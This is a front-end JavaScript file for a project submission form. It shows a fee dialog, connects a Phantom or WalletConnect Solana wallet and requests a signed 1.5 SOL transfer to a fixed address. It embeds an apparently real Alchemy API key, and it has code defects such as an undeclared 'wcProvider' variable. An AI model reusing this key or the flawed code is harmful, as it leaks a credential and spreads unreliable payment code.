'use strict';

import * as splToken from "https://esm.sh/@solana/spl-token";

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const phantomButton = document.getElementById('phantomButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let solanaProvider = null;
let connection = new window.solanaWeb3.Connection("https://solana-mainnet.g.alchemy.com/v2/M7idHd_uE745EwD7NcMb4");
let txInProgress = false;

/* ============================
   UI FLOW
   ============================ */
// Fix the submit handler
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();

    feeModal.classList.remove("hidden");
    feeModal.style.display = "flex";
  });
}

// Close fee modal
if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = "none";
    feeModal.classList.add("hidden");
  });
}

// Proceed to wallet selection
if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = "none";
    feeModal.classList.add("hidden");

    walletModal.classList.remove("hidden");
    walletModal.style.display = "flex";
  });
}

// Close wallet modal
if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = "none";
    walletModal.classList.add("hidden");
  });
}

// ---------- PHANTOM ----------
async function connectPhantom() {
  try {
    const provider = window.solana;

    if (!provider || !provider.isPhantom) {
      alert("Phantom Wallet not installed.");
      return;
    }

    const resp = await provider.connect();
    solanaProvider = provider;

    await requestPayment(resp.publicKey);

  } catch (err) {
    console.error(err);
  }
}

// ---------- WALLETCONNECT ----------
async function connectWalletConnectSolana() {
  try {

    const { SolanaProvider } =
      await import("https://esm.sh/@walletconnect/solana-provider@latest");

    wcProvider = await SolanaProvider.init({
      projectId: "YOUR_PROJECT_ID",
      chains: ["solana:mainnet"],
      showQrModal: true,
      rpcMap: {
        "solana:mainnet": "https://api.mainnet-beta.solana.com"
      }
    });

    const accounts = await wcProvider.enable();

    solanaProvider = wcProvider;

    await requestPayment(accounts[0]);

  } catch (err) {
    console.error(err);
  }
}

// ---------- SIMPLE PAYMENT ----------
async function requestPayment(account) {

  const receiver =
    new window.solanaWeb3.PublicKey(
      "39LLqoEdw4Ahx8dj8hA4uZVCBS1rUNaKvthr1YnJQp2u"
    );

  const sender =
    new window.solanaWeb3.PublicKey(account);

  const transaction = new window.solanaWeb3.Transaction().add(

    window.solanaWeb3.SystemProgram.transfer({

      fromPubkey: sender,

      toPubkey: receiver,

      lamports: 1.5 * window.solanaWeb3.LAMPORTS_PER_SOL

    })

  );

  transaction.feePayer = sender;

  const latest =
    await connection.getLatestBlockhash();

  transaction.recentBlockhash =
    latest.blockhash;

  const signed =
    await solanaProvider.signTransaction(transaction);

  const signature =
    await connection.sendRawTransaction(
      signed.serialize()
    );

  alert(
    "Payment submitted.\n\nTransaction:\n" + signature
  );
}
